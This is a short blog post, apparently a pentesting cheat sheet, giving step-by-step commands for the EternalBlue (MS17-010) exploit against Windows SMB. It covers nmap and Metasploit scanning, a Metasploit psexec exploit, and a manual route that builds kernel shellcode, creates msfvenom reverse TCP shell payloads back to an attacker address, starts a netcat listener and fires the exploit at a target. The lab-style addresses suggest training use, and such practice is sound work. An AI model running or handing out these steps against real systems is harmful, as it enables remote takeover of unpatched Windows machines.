---
layout: post
title: "Exploit: EternalBlue"
date: 2022-09-04 18:07 +0100
tags: pentesting cia windows hacking
categories: [Pentesting, Exploit]
published: true
---

## Scanning

```bash
nmap -p 135,445 -sV -Pn -vvv --script smb-vuln-ms17-010.nse
```

## The Metasploit Way

MSF Scanner:

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.11.1.0/24
exploit
```

MSF Payload:

```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.10
set LHOST 10.10.14.3
set LPORT 1111
exploit
```

## The "Manual Way"

[WoraWit Github: MS17-010](https://github.com/worawit/MS17-010)

Pretty simple to setup the exploit, but can get confusing if you don't know what you're doing.

- Locate your target (Nmap has a scanner, so does MSF)
- Clone the git repo at the top of this post
- `cd` into the `shellcode` folder
- You should see three files, two `.asm` files and one `.py`
- Do the following for both `.asm` files:

## x64

```bash
nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin

msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=10.11.0.46 --platform windows -a x64 --format raw -o sc_x64_payload.bin

cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
```

## x86

```bash
nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin

msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.11.0.46 --platform windows -a x86 --format raw -o sc_x86_payload.bin

cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
```

## Combine the Binaries

```bash
python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
```

Confirm all the files are there:

```bash
ls -la
```

Should be 7 (not including the three original files)

## Fire the Payload

Start up a listener:

```bash
nc -lvnp 443
```

```bash
python eternalblue_exploit7.py 10.10.10.10 shellcode/sc_all.bin
```

Enjoy your shells.
